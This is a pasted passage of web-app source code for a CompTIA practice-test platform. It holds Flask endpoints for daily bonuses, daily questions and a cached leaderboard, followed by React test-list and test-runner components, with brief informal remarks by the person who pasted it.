+            "currentQuestionIndex": current_index,
+            "finished": data.get("finished", False)
+        }}
+    )
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    return jsonify({"message": "Position updated"}), 200
+
+##############################################
+# DAILY QUESTION ENDPOINTS
+##############################################
+@api_bp.route('/user/<user_id>/daily-bonus', methods=['POST'])
+def daily_bonus(user_id):
+    user = None
+    start_db = time.time()
+    user = get_user_by_id(user_id)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if not user:
+        return jsonify({"error": "User not found"}), 404
+
+    now = datetime.utcnow()
+    last_claim = user.get("lastDailyClaim")
+    if last_claim and (now - last_claim) < timedelta(hours=24):
+        seconds_left = int(24 * 3600 - (now - last_claim).total_seconds())
+        return jsonify({
+            "success": False,
+            "message": f"Already claimed. Next bonus in: {seconds_left} seconds",
+            "newCoins": user.get("coins", 0),
+            "newXP": user.get("xp", 0),
+            "newLastDailyClaim": serialize_datetime(last_claim)
+        }), 200
+    else:
+        start_db = time.time()
+        update_user_coins(user_id, 250)
+        duration = time.time() - start_db
+        if not hasattr(g, 'db_time_accumulator'):
+            g.db_time_accumulator = 0.0
+        g.db_time_accumulator += duration
+
+        start_db = time.time()
+        mainusers_collection.update_one(
+            {"_id": user["_id"]},
+            {"$set": {"lastDailyClaim": now}}
+        )
+        duration = time.time() - start_db
+        if not hasattr(g, 'db_time_accumulator'):
+            g.db_time_accumulator = 0.0
+        g.db_time_accumulator += duration
+
+        start_db = time.time()
+        updated_user = get_user_by_id(user_id)
+        duration = time.time() - start_db
+        if not hasattr(g, 'db_time_accumulator'):
+            g.db_time_accumulator = 0.0
+        g.db_time_accumulator += duration
+
+        start_db = time.time()
+        newly_unlocked = check_and_unlock_achievements(user_id)
+        duration = time.time() - start_db
+        if not hasattr(g, 'db_time_accumulator'):
+            g.db_time_accumulator = 0.0
+        g.db_time_accumulator += duration
+
+        return jsonify({
+            "success": True,
+            "message": "Daily bonus applied",
+            "newCoins": updated_user.get("coins", 0),
+            "newXP": updated_user.get("xp", 0),
+            "newLastDailyClaim": serialize_datetime(updated_user.get("lastDailyClaim")),
+            "newlyUnlocked": newly_unlocked
+        }), 200
+
+@api_bp.route('/daily-question', methods=['GET'])
+def get_daily_question():
+    user_id = request.args.get("userId")
+    if not user_id:
+        return jsonify({"error": "No userId provided"}), 400
+
+    try:
+        user_oid = ObjectId(user_id)
+    except Exception:
+        return jsonify({"error": "Invalid user ID"}), 400
+
+    current_date = datetime.utcnow()
+    reference_date = datetime(2025, 3, 11)  # Or any starting date you prefer
+    day_index = (current_date - reference_date).days % 300  # This will cycle through 0-29
+
+    start_db = time.time()
+    daily_doc = dailyQuestions_collection.find_one({"dayIndex": day_index})
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if not daily_doc:
+        return jsonify({"error": f"No daily question for dayIndex={day_index}"}), 404
+
+    start_db = time.time()
+    existing_answer = dailyAnswers_collection.find_one({
+        "userId": user_oid,
+        "dayIndex": day_index
+    })
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    response = {
+        "dayIndex": day_index,
+        "prompt": daily_doc.get("prompt"),
+        "options": daily_doc.get("options"),
+        "explanation": daily_doc.get("explanation"),
+        "alreadyAnswered": bool(existing_answer)
+    }
+    return jsonify(response), 200
+
+@api_bp.route('/daily-question/answer', methods=['POST'])
+def submit_daily_question():
+    data = request.json or {}
+    user_id = data.get("userId")
+    current_date = datetime.utcnow()
+    reference_date = datetime(2025, 3, 11)  # Keep your reference date consistent
+    day_index = (current_date - reference_date).days % 300
+    selected_index = data.get("selectedIndex")
+
+    if not user_id or day_index is None or selected_index is None:
+        return jsonify({"error": "Missing userId, dayIndex, or selectedIndex"}), 400
+
+    try:
+        user_oid = ObjectId(user_id)
+    except Exception:
+        return jsonify({"error": "Invalid user ID"}), 400
+
+    start_db = time.time()
+    daily_doc = dailyQuestions_collection.find_one({"dayIndex": day_index})
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if not daily_doc:
+        return jsonify({"error": f"No daily question for dayIndex={day_index}"}), 404
+
+    start_db = time.time()
+    existing = dailyAnswers_collection.find_one({
+        "userId": user_oid,
+        "dayIndex": day_index
+    })
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if existing:
+        return jsonify({"error": "You already answered today's question"}), 400
+
+    correct_index = daily_doc.get("correctIndex", 0)
+    is_correct = (selected_index == correct_index)
+    awarded_coins = 250 if is_correct else 50
+
+    start_db = time.time()
+    dailyAnswers_collection.insert_one({
+        "userId": user_oid,
+        "dayIndex": day_index,
+        "answeredAt": datetime.utcnow(),
+        "userAnswerIndex": selected_index,
+        "isCorrect": is_correct
+    })
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    start_db = time.time()
+    update_user_coins(str(user_oid), awarded_coins)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    start_db = time.time()
+    updated_user = get_user_by_id(user_id)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    start_db = time.time()
+    newly_unlocked = check_and_unlock_achievements(user_id)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    return jsonify({
+        "message": "Answer submitted",
+        "correct": is_correct,
+        "awardedCoins": awarded_coins,
+        "newCoins": updated_user.get("coins", 0),
+        "newXP": updated_user.get("xp", 0),
+        "newLastDailyClaim": serialize_datetime(updated_user.get("lastDailyClaim")),
+        "newlyUnlocked": newly_unlocked,
+        "explanation": daily_doc.get("explanation")
+    }), 200
+
+
+#############################################
+# Public Leaderboard Caching (30-minute TTL)
+#############################################
+public_leaderboard_cache = []
+public_leaderboard_cache_timestamp = 0
+PUBLIC_LEADERBOARD_CACHE_DURATION_MS = 1800000  # 30 minutes (1800 seconds)
+
+@public_leaderboard_bp.route('/board', methods=['GET'])
+def get_public_leaderboard():
+    """
+    Public leaderboard with a longer cache duration (30 minutes)
+    This is for the marketing site, separate from the logged-in user leaderboard
+    """
+    global public_leaderboard_cache
+    global public_leaderboard_cache_timestamp
+
+    now_ms = int(time.time() * 1000)
+    if now_ms - public_leaderboard_cache_timestamp > PUBLIC_LEADERBOARD_CACHE_DURATION_MS:
+        start_db = time.time()
+        cursor = mainusers_collection.find(
+            {},
+            {"username": 1, "level": 1, "xp": 1, "currentAvatar": 1}
+        ).sort("level", -1).limit(1000)
+        duration = time.time() - start_db
+        if not hasattr(g, 'db_time_accumulator'):
+            g.db_time_accumulator = 0.0
+        g.db_time_accumulator += duration
+
+        new_results = []
+        rank = 1
+        for user in cursor:
+            user_data = {
+                "username": user.get("username", "unknown"),
+                "level": user.get("level", 1),
+                "xp": user.get("xp", 0),
+                "rank": rank,
+                "avatarUrl": None
+            }
+            if user.get("currentAvatar"):
+                start_db = time.time()
+                avatar_item = shop_collection.find_one({"_id": user["currentAvatar"]})
+                duration = time.time() - start_db
+                if not hasattr(g, 'db_time_accumulator'):
+                    g.db_time_accumulator = 0.0
+                g.db_time_accumulator += duration
+
+                if avatar_item and "imageUrl" in avatar_item:
+                    user_data["avatarUrl"] = avatar_item["imageUrl"]
+            new_results.append(user_data)
+            rank += 1
+
+        public_leaderboard_cache = new_results
+        public_leaderboard_cache_timestamp = now_ms
+
+    try:
+        skip = int(request.args.get("skip", 0))
+        limit = int(request.args.get("limit", 50))
+        cache_param = request.args.get("cache", "1800")  # Default 30 minutes
+    except:
+        skip, limit = 0, 50
+
+    total_entries = len(public_leaderboard_cache)
+    end_index = skip + limit
+    if skip > total_entries:
+        sliced_data = []
+    else:
+        sliced_data = public_leaderboard_cache[skip:end_index]
+
+    return jsonify({
+        "data": sliced_data,
+        "total": total_entries,
+        "cached_at": public_leaderboard_cache_timestamp,
+        "cache_duration_ms": PUBLIC_LEADERBOARD_CACHE_DURATION_MS
+    }), 200
+
+
+now frontend:
+
+so here are one exmaple of the etstlistpage and tetspoage of a categroy (tehy probbaly dont/ dont want to edit them tho) but good for conetxt possibly
+
+import React, { useEffect, useState } from "react";
+import { useSelector } from "react-redux";
+import { useNavigate } from "react-router-dom";
+import "../../test.css";
+import {
+  FaPlay,
+  FaPause,
+  FaRedo,
+  FaEye,
+  FaInfoCircle,
+  FaChevronRight,
+  FaLock,
+  FaTrophy,
+  FaCog,
+  FaCheck,
+  FaTimes,
+  FaExclamationTriangle
+} from "react-icons/fa";
+
+const APlusTestList = () => {
+  const navigate = useNavigate();
+  const { userId } = useSelector((state) => state.user);
+  const totalQuestionsPerTest = 100;
+  const category = "aplus";
+
+  const [attemptData, setAttemptData] = useState({});
+  const [loading, setLoading] = useState(false);
+  const [error, setError] = useState(null);
+
+  // Persist examMode in localStorage
+  const [examMode, setExamMode] = useState(() => {
+    const stored = localStorage.getItem("examMode");
+    return stored === "true";
+  });
+
+  // Show/hide tooltip for the info icon
+  const [showExamInfo, setShowExamInfo] = useState(false);
+
+  // Restart popup on the test list page (holds test number)
+  const [restartPopupTest, setRestartPopupTest] = useState(null);
+
+  // Choose test length
+  const allowedTestLengths = [25, 50, 75, 100];
+  const [selectedLengths, setSelectedLengths] = useState({});
+
+  useEffect(() => {
+    if (!userId) return;
+    setLoading(true);
+
+    const fetchAttempts = async () => {
+      try {
+        const res = await fetch(`/api/test/attempts/${userId}/list`);
+        if (!res.ok) {
+          throw new Error("Failed to fetch attempts for user");
+        }
+        const data = await res.json();
+        const attemptList = data.attempts || [];
+
+        // Filter attempts for this category
+        const relevant = attemptList.filter((a) => a.category === category);
+
+        // For each testId, pick the best attempt doc:
+        const bestAttempts = {};
+        for (let att of relevant) {
+          const testKey = att.testId;
+          if (!bestAttempts[testKey]) {
+            bestAttempts[testKey] = att;
+          } else {
+            const existing = bestAttempts[testKey];
+            // Prefer an unfinished attempt if it exists; otherwise latest finished
+            if (!existing.finished && att.finished) {
+              // Keep existing
+            } else if (existing.finished && !att.finished) {
+              bestAttempts[testKey] = att;
+            } else {
+              // Both finished or both unfinished => pick newest
+              const existingTime = new Date(existing.finishedAt || 0).getTime();
+              const newTime = new Date(att.finishedAt || 0).getTime();
+              if (newTime > existingTime) {
+                bestAttempts[testKey] = att;
+              }
+            }
+          }
+        }
+
+        setAttemptData(bestAttempts);
+        setLoading(false);
+      } catch (err) {
+        console.error(err);
+        setError(err.message);
+        setLoading(false);
+      }
+    };
+
+    fetchAttempts();
+  }, [userId, category]);
+
+  // Save examMode to localStorage whenever it changes
+  useEffect(() => {
+    localStorage.setItem("examMode", examMode ? "true" : "false");
+  }, [examMode]);
+
+  if (!userId) {
+    return (
+      <div className="testlist-container">
+        <div className="testlist-auth-message">
+          <FaLock className="testlist-auth-icon" />
+          <h2>Please log in to access the practice tests</h2>
+          <button 
+            className="testlist-login-button"
+            onClick={() => navigate('/login')}
+          >
+            Go to Login
+          </button>
+        </div>
+      </div>
+    );
+  }
+
+  if (loading) {
+    return (
+      <div className="testlist-container">
+        <div className="testlist-loading">
+          <div className="testlist-loading-spinner"></div>
+          <p>Loading your test progress...</p>
+        </div>
+      </div>
+    );
+  }
+
+  if (error) {
+    return (
+      <div className="testlist-container">
+        <div className="testlist-error">
+          <FaExclamationTriangle className="testlist-error-icon" />
+          <h2>Error Loading Tests</h2>
+          <p>{error}</p>
+          <button 
+            className="testlist-retry-button"
+            onClick={() => window.location.reload()}
+          >
+            Retry
+          </button>
+        </div>
+      </div>
+    );
+  }
+
+  const getAttemptDoc = (testNumber) => {
+    return attemptData[testNumber] || null;
+  };
+
+  const getProgressDisplay = (attemptDoc) => {
+    if (!attemptDoc) return { text: "Not started", percentage: 0 };
+    
+    const { finished, score, totalQuestions, currentQuestionIndex } = attemptDoc;
+    
+    if (finished) {
+      const pct = Math.round((score / (totalQuestions || totalQuestionsPerTest)) * 100);
+      return { 
+        text: `Score: ${score}/${totalQuestions || totalQuestionsPerTest} (${pct}%)`, 
+        percentage: pct,
+        isFinished: true
+      };
+    } else {
+      if (typeof currentQuestionIndex === "number") {
+        const progressPct = Math.round(((currentQuestionIndex + 1) / (totalQuestions || totalQuestionsPerTest)) * 100);
+        return { 
+          text: `Progress: ${currentQuestionIndex + 1}/${totalQuestions || totalQuestionsPerTest}`, 
+          percentage: progressPct,
+          isFinished: false
+        };
+      }
+      return { text: "Not started", percentage: 0 };
+    }
+  };
+
+  const difficultyCategories = [
+    { label: "Normal", color: "#fff9e6", textColor: "#4a4a4a" },             // Cream
+    { label: "Very Easy", color: "#adebad", textColor: "#0b3800" },          // Soft green
+    { label: "Easy", color: "#87cefa", textColor: "#000000" },               // Light sky blue
+    { label: "Moderate", color: "#ffc765", textColor: "#4a2700" },           // Warm orange
+    { label: "Intermediate", color: "#ff5959", textColor: "#ffffff" },       // Coral red
+    { label: "Formidable", color: "#dc3545", textColor: "#ffffff" },         // Bootstrap red
+    { label: "Challenging", color: "#b108f6", textColor: "#ffffff" },        // Bright purple
+    { label: "Very Challenging", color: "#4b0082", textColor: "#ffffff" },   // Indigo
+    { label: "Ruthless", color: "#370031", textColor: "#ffffff" },           // Very dark purple
+    { label: "Ultra Level", color: "#000000", textColor: "#00ffff" }         // Black with neon cyan text
+  ];
+
+  const startTest = (testNumber, doRestart = false, existingAttempt = null) => {
+    if (existingAttempt && !doRestart) {
+      // Resume test
+      navigate(`/practice-tests/a-plus/${testNumber}`);
+    } else {
+      // New or forced restart
+      const lengthToUse = selectedLengths[testNumber] || totalQuestionsPerTest;
+      fetch(`/api/test/attempts/${userId}/${testNumber}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          category,
+          answers: [],
+          score: 0,
+          totalQuestions: totalQuestionsPerTest,
+          selectedLength: lengthToUse,
+          currentQuestionIndex: 0,
+          shuffleOrder: [],
+          answerOrder: [],
+          finished: false,
+          examMode
+        })
+      })
+        .then(() => {
+          navigate(`/practice-tests/a-plus/${testNumber}`, {
+            state: { examMode }
+          });
+        })
+        .catch((err) => {
+          console.error("Failed to create new attempt doc:", err);
+        });
+    }
+  };
+
+  const examInfoText = "Exam Mode simulates a real certification exam environment by hiding answer feedback and explanations until after you complete the entire test. This helps you prepare for the pressure and pace of an actual exam.";
+
+  return (
+    <div className="testlist-container">
+      <div className="testlist-header">
+        <div className="testlist-title-section">
+          <h1 className="testlist-title">CompTIA A+ Core 1</h1>
+          <p className="testlist-subtitle">Practice Test Collection</p>
+        </div>
+        
+        <div className="testlist-mode-toggle">
+          <div className="testlist-mode-label">
+            <FaCog className="testlist-mode-icon" />
+            <span>Exam Mode</span>
+            
+            <div className="testlist-info-container">
+              <FaInfoCircle 
+                className="testlist-info-icon"
+                onMouseEnter={() => setShowExamInfo(true)}
+                onMouseLeave={() => setShowExamInfo(false)}
+                onClick={() => setShowExamInfo(!showExamInfo)}
+              />
+              
+              {showExamInfo && (
+                <div className="testlist-info-tooltip">
+                  {examInfoText}
+                </div>
+              )}
+            </div>
+          </div>
+          
+          <label className="testlist-toggle">
+            <input
+              type="checkbox"
+              checked={examMode}
+              onChange={(e) => setExamMode(e.target.checked)}
+            />
+            <span className="testlist-toggle-slider">
+              <span className="testlist-toggle-text">
+                {examMode ? "ON" : "OFF"}
+              </span>
+            </span>
+          </label>
+        </div>
+      </div>
+
+      <div className="testlist-grid">
+        {Array.from({ length: 10 }, (_, i) => {
+          const testNumber = i + 1;
+          const attemptDoc = getAttemptDoc(testNumber);
+          const progress = getProgressDisplay(attemptDoc);
+          const difficulty = difficultyCategories[i] || difficultyCategories[0];
+
+          const isFinished = attemptDoc?.finished;
+          const noAttempt = !attemptDoc;
+          const inProgress = attemptDoc && !isFinished;
+
+          return (
+            <div key={testNumber} className={`testlist-card ${isFinished ? 'testlist-card-completed' : inProgress ? 'testlist-card-progress' : ''}`}>
+              <div className="testlist-card-header">
+                <div className="testlist-card-number">Test {testNumber}</div>
+                <div 
+                  className="testlist-difficulty" 
+                  style={{ backgroundColor: difficulty.color, color: difficulty.textColor }}
+                >
+                  {difficulty.label}
+                </div>
+              </div>
+              
+              <div className="testlist-card-content">
+                <div className="testlist-progress-section">
+                  <div className="testlist-progress-text">{progress.text}</div>
+                  <div className="testlist-progress-bar-container">
+                    <div 
+                      className={`testlist-progress-bar ${isFinished ? 'testlist-progress-complete' : ''}`}
+                      style={{ width: `${progress.percentage}%` }}
+                    ></div>
+                  </div>
+                </div>
+                
+                {/* Length Selector */}
+                {(noAttempt || isFinished) && (
+                  <div className="testlist-length-selector">
+                    <div className="testlist-length-label">Select question count:</div>
+                    <div className="testlist-length-options">
+                      {allowedTestLengths.map((length) => (
+                        <label 
+                          key={length} 
+                          className={`testlist-length-option ${(selectedLengths[testNumber] || totalQuestionsPerTest) === length ? 'selected' : ''}`}
+                        >
+                          <input
+                            type="radio"
+                            name={`testLength-${testNumber}`}
+                            value={length}
+                            checked={(selectedLengths[testNumber] || totalQuestionsPerTest) === length}
+                            onChange={(e) => 
+                              setSelectedLengths((prev) => ({
+                                ...prev,
+                                [testNumber]: Number(e.target.value)
+                              }))
+                            }
+                          />
+                          <span>{length}</span>
+                        </label>
+                      ))}
+                    </div>
+                  </div>
+                )}
+                
+                {/* Action Buttons */}
+                <div className={`testlist-card-actions ${inProgress ? 'two-buttons' : ''}`}>
+                  {noAttempt && (
+                    <button
+                      className="testlist-action-button testlist-start-button"
+                      onClick={() => startTest(testNumber, false, null)}
+                    >
+                      <FaPlay className="testlist-action-icon" />
+                      <span>Start Test</span>
+                    </button>
+                  )}
+                  
+                  {inProgress && (
+                    <>
+                      <button
+                        className="testlist-action-button testlist-resume-button"
+                        onClick={() => startTest(testNumber, false, attemptDoc)}
+                      >
+                        <FaPlay className="testlist-action-icon" />
+                        <span>Resume</span>
+                      </button>
+                      
+                      <button
+                        className="testlist-action-button testlist-restart-button"
+                        onClick={() => setRestartPopupTest(testNumber)}
+                      >
+                        <FaRedo className="testlist-action-icon" />
+                        <span>Restart</span>
+                      </button>
+                    </>
+                  )}
+                  
+                  {isFinished && (
+                    <>
+                      <button
+                        className="testlist-action-button testlist-review-button"
+                        onClick={() => 
+                          navigate(`/practice-tests/a-plus/${testNumber}`, {
+                            state: { review: true }
+                          })
+                        }
+                      >
+                        <FaEye className="testlist-action-icon" />
+                        <span>View Results</span>
+                      </button>
+                      
+                      <button
+                        className="testlist-action-button testlist-restart-button"
+                        onClick={() => startTest(testNumber, true, attemptDoc)}
+                      >
+                        <FaRedo className="testlist-action-icon" />
+                        <span>Restart</span>
+                      </button>
+                    </>
+                  )}
+                </div>
+              </div>
+              
+              {isFinished && progress.percentage >= 80 && (
+                <div className="testlist-achievement-badge">
+                  <FaTrophy className="testlist-achievement-icon" />
+                </div>
+              )}
+            </div>
+          );
+        })}
+      </div>
+
+      {/* Restart Confirmation Popup */}
+      {restartPopupTest !== null && (
+        <div className="testlist-popup-overlay">
+          <div className="testlist-popup">
+            <div className="testlist-popup-header">
+              <FaExclamationTriangle className="testlist-popup-icon" />
+              <h3>Confirm Restart</h3>
+            </div>
+            
+            <div className="testlist-popup-content">
+              <p>You're currently in progress on Test {restartPopupTest}. Are you sure you want to restart?</p>
+              <p>All current progress will be lost, and your test will begin with your selected length.</p>
+            </div>
+            
+            <div className="testlist-popup-actions">
+              <button
+                className="testlist-popup-button testlist-popup-confirm"
+                onClick={() => {
+                  const attemptDoc = getAttemptDoc(restartPopupTest);
+                  startTest(restartPopupTest, true, attemptDoc);
+                  setRestartPopupTest(null);
+                }}
+              >
+                <FaCheck className="testlist-popup-button-icon" />
+                <span>Yes, Restart</span>
+              </button>
+              
+              <button 
+                className="testlist-popup-button testlist-popup-cancel"
+                onClick={() => setRestartPopupTest(null)}
+              >
+                <FaTimes className="testlist-popup-button-icon" />
+                <span>Cancel</span>
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+    </div>
+  );
+};
+
+export default APlusTestList;
+
+
+// APlusTestPage.js
+import React, { memo } from "react";
+import { useParams } from "react-router-dom";
+import APlusTestList from "./APlusTestList";
+import GlobalTestPage from "../../GlobalTestPage";
+import "../../test.css";
+
+// Memoize component to prevent unnecessary re-renders
+const APlusTestPage = memo(() => {
+  const { testId } = useParams();
+
+  // If no testId in URL, show the test list
+  if (!testId) {
+    return <APlusTestList />;
+  }
+
+  // Otherwise, show the universal test runner
+  return (
+    <GlobalTestPage
+      testId={testId}
+      category="aplus"
+      backToListPath="/practice-tests/a-plus"
+    />
+  );
+});
+
+export default APlusTestPage;
+
+
+
+
+now heres teh test.css and globaltestpage
+
+import React, {
+  useState,
+  useEffect,
+  useCallback,
+  useMemo,
+  useRef
+} from "react";
+import { useNavigate, useLocation } from "react-router-dom";
+import { useSelector, useDispatch } from "react-redux";
+import { setXPAndCoins } from "./pages/store/userSlice";
+import { fetchShopItems } from "./pages/store/shopSlice";
+import ConfettiAnimation from "./ConfettiAnimation";
+import { showAchievementToast } from "./pages/store/AchievementToast";
+import "./test.css";
+import iconMapping from "./iconMapping";
+import colorMapping from "./colorMapping";
+import {
+  FaTrophy,
+  FaMedal,
+  FaStar,
+  FaCrown,
+  FaBolt,
+  FaBook,
+  FaBrain,
+  FaCheckCircle,
+  FaCoins,
+  FaFlagCheckered,
+  FaArrowLeft,
+  FaArrowRight,
+  FaRedoAlt,
+  FaStepForward,
+  FaExclamationTriangle,
+  FaPlay,
+  FaEye,
+  FaChevronLeft,
+  FaChevronRight,
+  FaTimes,
+  FaCheck,
+  FaFlag,
+  FaLevelUpAlt,
+  FaSpinner,
+  FaList,
+  FaClipboardList,
+  FaFilter,
+  FaAngleDoubleRight,
+  FaAngleDoubleLeft,
+  FaUser,
+  FaPause,
+  FaClock
+} from "react-icons/fa";
+
+// Helper functions
+function shuffleArray(arr) {
+  const copy = [...arr];
+  for (let i = copy.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [copy[i], copy[j]] = [copy[j], copy[i]];
+  }
+  return copy;
+}
+
+function shuffleIndices(length) {
+  const indices = Array.from({ length }, (_, i) => i);
+  return shuffleArray(indices);
+}
+
+// Format seconds into MM:SS display
+function formatTime(totalSeconds) {
+  const minutes = Math.floor(totalSeconds / 60);
+  const seconds = totalSeconds % 60;
+  return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+}
+
+// Reusable QuestionDropdown component
+const QuestionDropdown = ({
+  totalQuestions,
+  currentQuestionIndex,
+  onQuestionSelect,
+  answers,
+  flaggedQuestions,
+  testData,
+  shuffleOrder,
+  examMode
+}) => {
+  const [isOpen, setIsOpen] = useState(false);
+  const dropdownRef = useRef(null);
+
+  useEffect(() => {
+    const handleClickOutside = (event) => {
+      if (dropdownRef.current && !dropdownRef.current.contains(event.target)) {
+        setIsOpen(false);
+      }
+    };
+    document.addEventListener("mousedown", handleClickOutside);
+    return () => document.removeEventListener("mousedown", handleClickOutside);
+  }, []);
+
+  const getQuestionStatus = (index) => {
+    const realIndex = shuffleOrder[index];
+    const question = testData.questions[realIndex];
+    const answer = answers.find((a) => a.questionId === question.id);
+    const isFlagged = flaggedQuestions.includes(question.id);
+    const isAnswered = answer?.userAnswerIndex !== undefined;
+    const isSkipped = answer?.userAnswerIndex === null;
+    const isCorrect =
+      answer && answer.userAnswerIndex === question.correctAnswerIndex;
+    return { isAnswered, isSkipped, isCorrect, isFlagged };
+  };
+
+  return (
+    <div className="question-dropdown" ref={dropdownRef}>
+      <button onClick={() => setIsOpen(!isOpen)} className="dropdown-button">
+        <FaList className="dropdown-icon" />
+        <span>Question {currentQuestionIndex + 1} of {totalQuestions}</span>
+      </button>
+      {isOpen && (
+        <div className="dropdown-content">
+          {Array.from({ length: totalQuestions }, (_, i) => {
+            const status = getQuestionStatus(i);
+            let statusClass = "";
+            if (status.isAnswered && !status.isSkipped) {
+              statusClass = status.isCorrect ? "correct" : "incorrect";
+            } else if (status.isSkipped) {
+              statusClass = "skipped";
+            }
+            
+            return (
+              <button
+                key={i}
+                onClick={() => {
+                  onQuestionSelect(i);
+                  setIsOpen(false);
+                }}
+                className={`dropdown-item ${i === currentQuestionIndex ? 'active' : ''} ${statusClass}`}
+              >
+                <span>Question {i + 1}</span>
+                <div className="status-indicators">
+                  {status.isSkipped && <span className="skip-indicator">⏭️</span>}
+                  {status.isFlagged && <span className="flag-indicator">🚩</span>}
+                  {!examMode && status.isAnswered && !status.isSkipped && (
+                    <span
+                      className={
+                        status.isCorrect
+                          ? "answer-indicator correct"
+                          : "answer-indicator incorrect"
+                      }
+                    >
+                      {status.isCorrect ? "✓" : "✗"}
+                    </span>
+                  )}
+                </div>
+              </button>
+            );
+          })}
+        </div>
+      )}
+    </div>
+  );
+};
+
+const GlobalTestPage = ({
+  testId,
+  category,
+  backToListPath
+}) => {
+  const location = useLocation();
+  const navigate = useNavigate();
+  const dispatch = useDispatch();
+
+  // Redux user data
+  const { xp, level, coins, userId, xpBoost, currentAvatar } = useSelector(
+    (state) => state.user
+  );
+  const achievements = useSelector((state) => state.achievements.all);
+  const { items: shopItems, status: shopStatus } = useSelector(
+    (state) => state.shop
+  );
+
+  // Local states for test logic
+  const [testData, setTestData] = useState(null);
+  const [shuffleOrder, setShuffleOrder] = useState([]);
+  const [answerOrder, setAnswerOrder] = useState([]);
+  const [currentQuestionIndex, setCurrentQuestionIndex] = useState(0);
+  const [answers, setAnswers] = useState([]);
+  const [score, setScore] = useState(0);
+  const [loadingTest, setLoadingTest] = useState(true);
+  const [error, setError] = useState(null);
+  const [isAnswered, setIsAnswered] = useState(false);
+  const [selectedOptionIndex, setSelectedOptionIndex] = useState(null);
+  const [isFinished, setIsFinished] = useState(false);
+
+  // Timer states
+  const [examTimer, setExamTimer] = useState(0);
+  const [isTimerRunning, setIsTimerRunning] = useState(false);
+  const timerIntervalRef = useRef(null);
+
+  // Overlays
+  const [showScoreOverlay, setShowScoreOverlay] = useState(false);
+  const [showReviewMode, setShowReviewMode] = useState(false);
+
+  // Confetti on level-up
+  const [localLevel, setLocalLevel] = useState(level);
+  const [showLevelUpOverlay, setShowLevelUpOverlay] = useState(false);
+
+  // Flags
+  const [flaggedQuestions, setFlaggedQuestions] = useState([]);
+
+  // Confirmation popups
+  const [showRestartPopup, setShowRestartPopup] = useState(false);
+  const [showFinishPopup, setShowFinishPopup] = useState(false);
+  const [showNextPopup, setShowNextPopup] = useState(false);
+
+  // Exam mode
+  const [examMode, setExamMode] = useState(false);
+
+  // Test length selection state
+  const allowedTestLengths = [25, 50, 75, 100];
+  const [selectedLength, setSelectedLength] = useState(100);
+  const [activeTestLength, setActiveTestLength] = useState(null);
+  const [showTestLengthSelector, setShowTestLengthSelector] = useState(false);
+
+  useEffect(() => {
+    if (shopStatus === "idle") {
+      dispatch(fetchShopItems());
+    }
+  }, [shopStatus, dispatch]);
+
+  // Timer functions
+  const startTimer = useCallback(() => {
+    if (timerIntervalRef.current) return;
+    
+    setIsTimerRunning(true);
+    timerIntervalRef.current = setInterval(() => {
+      setExamTimer(prev => prev + 1);
+    }, 1000);
+  }, []);
+
+  const pauseTimer = useCallback(() => {
+    if (timerIntervalRef.current) {
+      clearInterval(timerIntervalRef.current);
+      timerIntervalRef.current = null;
+      setIsTimerRunning(false);
+    }
+  }, []);
+
+  const resetTimer = useCallback(() => {
+    if (timerIntervalRef.current) {
+      clearInterval(timerIntervalRef.current);
+      timerIntervalRef.current = null;
+    }
+    setExamTimer(0);
+    setIsTimerRunning(false);
+  }, []);
+
+  const updateTimerInDB = useCallback(async () => {
+    if (!userId || !testId) return;
+    
+    try {
+      await fetch(`/api/test/attempts/${userId}/${testId}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          examTimerSeconds: examTimer
+        })
+      });
+    } catch (err) {
+      console.error("Failed to update timer in database", err);
+    }
+  }, [userId, testId, examTimer]);
+
+  // Save timer value to database every 10 seconds
+  useEffect(() => {
+    if (examMode && isTimerRunning && examTimer % 10 === 0 && examTimer > 0) {
+      updateTimerInDB();
+    }
+  }, [examMode, isTimerRunning, examTimer, updateTimerInDB]);
+
+  // Clean up timer interval on unmount
+  useEffect(() => {
+    return () => {
+      if (timerIntervalRef.current) {
+        clearInterval(timerIntervalRef.current);
+      }
+      
+      // Save timer when leaving the component
+      if (examMode && examTimer > 0 && !isFinished) {
+        updateTimerInDB();
+      }
+    };
+  }, [examMode, examTimer, isFinished, updateTimerInDB]);
+
+  const fetchTestAndAttempt = async () => {
+    setLoadingTest(true);
+    try {
+      let attemptDoc = null;
+      if (userId) {
+        const attemptRes = await fetch(`/api/test/attempts/${userId}/${testId}`);
+        const attemptData = await attemptRes.json();
+        attemptDoc = attemptData.attempt || null;
+      }
+      const testRes = await fetch(`/api/test/tests/${category}/${testId}`);
+      if (!testRes.ok) {
+        const errData = await testRes.json().catch(() => ({}));
+        throw new Error(errData.error || "Failed to fetch test data");
+      }
+      const testDoc = await testRes.json();
+      setTestData(testDoc);
+
+      const totalQ = testDoc.questions.length;
+
+      // Check if attempt exists
+      if (attemptDoc) {
